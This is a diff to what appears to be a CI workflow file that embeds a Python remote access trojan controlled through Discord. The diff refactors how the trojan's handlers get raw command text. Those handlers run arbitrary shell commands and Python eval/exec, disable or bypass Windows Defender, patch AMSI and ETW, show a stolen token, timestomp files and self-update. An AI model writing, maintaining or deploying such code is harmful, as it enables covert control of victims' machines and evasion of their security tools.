@@ -89,6 +89,7 @@ jobs:
           SEL_FILE      = os.path.join(INSTALL_DIR, "sel")
           REG_PREFIX    = "SVCREG|"
           WEBHOOK       = ""
+          _RAW          = {}
 
           def _token():
               if TOKEN_URL and requests:
@@ -1375,7 +1376,7 @@ jobs:
 
           async def c_cmd(m, a): await send_long(m, await ex(run_cmd, " ".join(a) or "echo hello"))
           async def c_sh(m, a):
-              raw = getattr(m, "_raw", " ".join(a))
+              raw = _RAW.get(m.id, " ".join(a))
               if not raw: return await m.channel.send(f"cwd: {_shell.cwd}")
               await send_long(m, await ex(_shell.run, raw))
           async def c_pwd(m, a): await m.channel.send(f"📂 {_shell.cwd}")
@@ -1419,7 +1420,7 @@ jobs:
           async def c_bypass(m, a):   await send_long(m, await ex(f_bypass))
           async def c_defender(m, a): await send_long(m, await ex(f_defender, a[0] if a else "status"))
           async def c_amsi(m, a):
-              await send_long(m, await ex(f_amsi, getattr(m, "_raw", " ".join(a)) or "echo ok"))
+              await send_long(m, await ex(f_amsi, _RAW.get(m.id, " ".join(a)) or "echo ok"))
           async def c_etw(m, a):      await m.channel.send(await ex(etw_patch))
           async def c_token(m, a):    await m.channel.send(f"🔑 `{_token()[:40]}...`")
           async def c_timestomp(m, a):await m.channel.send(await ex(f_timestomp, " ".join(a) or SCRIPT_PATH))
@@ -1522,8 +1523,8 @@ jobs:
           async def c_update(m, a):
               await m.channel.send("🔄 ..."); await ex(f_update, " ".join(a))
 
-          async def c_eval(m, a): await send_long(m, await ex(f_eval, getattr(m, "_raw", " ".join(a))))
-          async def c_exec(m, a): await send_long(m, await ex(f_exec, getattr(m, "_raw", " ".join(a))))
+          async def c_eval(m, a): await send_long(m, await ex(f_eval, _RAW.get(m.id, " ".join(a))))
+          async def c_exec(m, a): await send_long(m, await ex(f_exec, _RAW.get(m.id, " ".join(a))))
 
           async def c_join(m, a):
               global _vc, _src
@@ -1613,7 +1614,7 @@ jobs:
                       if not await _is_master(message.channel): return
                       name, raw = _parse(content)
                       if name in LOCAL:
-                          setattr(message, "_raw", raw)
+                          _RAW[message.id] = raw
                           await COMMANDS[name](message, raw.split())
                           return
                       sel = get_sel()
@@ -1622,7 +1623,7 @@ jobs:
                       return
 
                   if not name or name not in COMMANDS: return
-                  setattr(message, "_raw", raw)
+                  _RAW[message.id] = raw
                   await COMMANDS[name](message, raw.split())
               except Exception as e:
                   try: await message.channel.send(f"⚠️ Lỗi: {e}")
